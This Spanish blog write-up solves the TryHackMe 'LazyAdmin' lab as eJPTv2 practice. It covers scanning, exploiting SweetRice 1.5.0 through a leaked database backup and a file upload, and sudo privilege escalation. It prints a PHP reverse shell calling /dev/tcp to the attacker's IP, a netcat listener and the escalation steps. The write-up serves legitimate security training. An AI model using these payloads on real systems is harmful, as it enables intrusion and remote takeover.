---
title: LazyAdmin
date: 2024-09-22
categories: [PREPARING EJPTv2, TryHackMe]
tags: []  # TAG names should always be lowercase
image: /assets/images/ejptv2/ejptV2.png
---

---

![picture](/assets/images/ejptv2/lazy1.png)

---

En la máquina **LazyAdmin**, gracias a una versión anticuada de un gestor de contenido, obtengo el archivo de *Backup* de una *BBDD*, en la que encuentro credenciales para acceder al gestor, una vez dentro, gracias a un **Arbitrary File Upload**, obtengo acceso al servidor, y escalo privilegios gracias a los permisos de **Sudo** sobre un script.

---

En este ***Writeup*** se engloban las siguientes fases:
- **[Reconocimiento](#reconocimiento)**
- **[Explotación](#explotación)**
- **[Escalada de privilegios](#escalada-de-privilegios)**

---

## **Reconocimiento**

Primero realizaré un *PING* para probar si tengo conectividad con la máquina.

```bash
ping -c 1 10.10.192.27
```

Tengo conectividad, y además compruebo que estoy ante una máquina **Linux** gracias al *TTL*.

![picture](/assets/images/ejptv2/lazy2.png)

A continuación, realizaré un escaneo con **NMAP**, para comprobar los puertos abiertos de la máquina.

```bash
nmap -p- --open -T5 10.10.192.27 -n -Pn
```

![picture](/assets/images/ejptv2/lazy3.png){: w="600" h="300" }

Voy a comprobar el contenido corriendo por el puerto **80 - HTTP**.

Encuentro una página por defecto de **Apache2**.

![picture](/assets/images/ejptv2/lazy4.png)

Al no encontrar nada interesante en el código fuente de la página, voy a realizar **Fuzzing** para intentar encontrar mediante fuerza bruta rutas o archivos que no pueda ver.

(*redirijo el **Stderr** al **/dev/null** porque me dan muchos errores*)

```bash
gobuster dir -u http://10.10.192.27/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403 -x .txt,.php,.md -t 200 2>/dev/null
```

Encuentro una ruta "**/content**".

![picture](/assets/images/ejptv2/lazy5.png)

Dentro de la ruta, encuentro el gestor **CMS** corriendo por el servicio.

![picture](/assets/images/ejptv2/lazy6.png)

Voy a volver a realizar **Fuzzing** sobre esta ruta.

```bash
gobuster dir -u http://10.10.192.27/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403 -x .txt,.php,.md -t 200 2>/dev/null
```

Encuentro los siguientes archivos, y rutas.

![picture](/assets/images/ejptv2/lazy7.png)

En el archivo de "**changelog.txt**", encuentro la versión del gestor de contenido (*CMS*) corriendo, **SweetRice - 1.5.0**. 

![picture](/assets/images/ejptv2/lazy8.png)

En la ruta "**/as**", el panel de *Login* del gestor de contenidos.

![picture](/assets/images/ejptv2/lazy9.png)

---

## **Explotación**

Buscando por internet, encuentro en la siguiente [**Web**](https://www.exploit-db.com/exploits/40718), que para las versiones "**<=1.5.1**", podemos descargarnos el archivo de *backup* de la base de datos **Mysql**.

![picture](/assets/images/ejptv2/lazy10.png)

Voy a la ruta, y lo descargo.

![picture](/assets/images/ejptv2/lazy11.png){: w="600" h="300" }

Mirando el archivo, encuentro unas credenciales.

![picture](/assets/images/ejptv2/lazy12.png)

La contraseña parece ser un **Hash**, me voy a la Web de [Crackstation](https://crackstation.net/) para intentar crackearlo, y obtengo la contraseña en texto claro.

![picture](/assets/images/ejptv2/lazy13.png)

Intentando entrar en el panel de *login* encontrado en la ruta "**/as**", obtengo resultado, y estoy dentro del gestor **CMS** como usuario administrador.

![picture](/assets/images/ejptv2/lazy14.png)

Volviendo a buscar en Internet, encuentro una vulnerabilidad **Arbitrary File Upload** para este gestor, podemos subir un archivo **ZIP** con código **PHP** en la pestaña de "*Media Center*, y vamos a poder ejecutarlo.

[**Enlace a la vulnerabilidad**](https://www.exploit-db.com/exploits/40716).

Creamos un archivo **PHP**, con el código necesario para que nos devuelva una **Reverse Shell**.

- Código

```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/'Nuestra Ip'/4444 0>&1'");
?>
```

Y el archivo lo comprimimos.

![picture](/assets/images/ejptv2/lazy15.png)

A continuación, subimos el archivo comprimido, y marcamos la opción para que nos extraiga el archivo.

![picture](/assets/images/ejptv2/lazy16.png)

Lo subimos, y nos va a aparecer con otro nombre.

![picture](/assets/images/ejptv2/lazy17.png)

Nos vamos a la ruta donde se encuentra el archivo subido, y vemos que lo tenemos ahí.

![picture](/assets/images/ejptv2/lazy18.png){: w="600" h="300" }

Antes de ejecutarlo, tendremos que crear un **Listener** en nuestra máquina local para poder recibir la **Shell** interactiva.

- Listener

```bash
nc -lnvp 4444
```

Y una vez estemos escuchando por el puerto indicado en el archivo subido, clicamos en el archivo y obtendremos una **Shell** en nuestra máquina local dentro del servidor.

![picture](/assets/images/ejptv2/lazy19.png)

A continuación, realizo un tratamiento de la **TTY** para mejorar la interacción con la terminal.

```bash
script /dev/null -c bash
Ctrl_Z
stty raw -echo;fg
ls
export SHELL=/bin/bash
export TERM=screen
stty rows 51 columns 208
reset
```

Encuentro un directorio en "**/home**" llamado "**itguy**", en el cual tenemos permisos de lectura, escritura y ejecución, y dentro del directorio encuentro la primera **flag** de usuario.

![picture](/assets/images/ejptv2/lazy20.png)

En el archivo "**mysql_login.txt**", encuentro unas credenciales de la base de datos **Mysql**, pero dentro de la *BBDD*, no encuentro nada interesante.

---

## **Escalada de privilegios**

Mirando los permisos de **SUDO** del usuario **www-data**, veo que no ncesita usar contraseña para ejecutar mediante **PERL** el script "**backup.pl**".

![picture](/assets/images/ejptv2/lazy21.png)

Viendo el contenido del script, veo que ejecuta otro script, ubicado en "**/etc/copy.sh**".

![picture](/assets/images/ejptv2/lazy22.png)


Y viendo el contenido del script "**copy.sh**", veo que ejecuta una **Reverse Shell**.

![picture](/assets/images/ejptv2/lazy23.png)

Viendo los permisos del script, veo que puedo modificarlo, así que en vez de ejecutar la **Reverse Shell**, sobrescribiré "**/bin/bash**" para que ejecute una bash como **root**.

![picture](/assets/images/ejptv2/lazy24.png)


Y a continuación, ejecuto el script como **SUDO**, obtengo una *bash* como el usuario **root**, y en su directorio personal encuentro la **flag** de **root**.

![picture](/assets/images/ejptv2/lazy25.png)

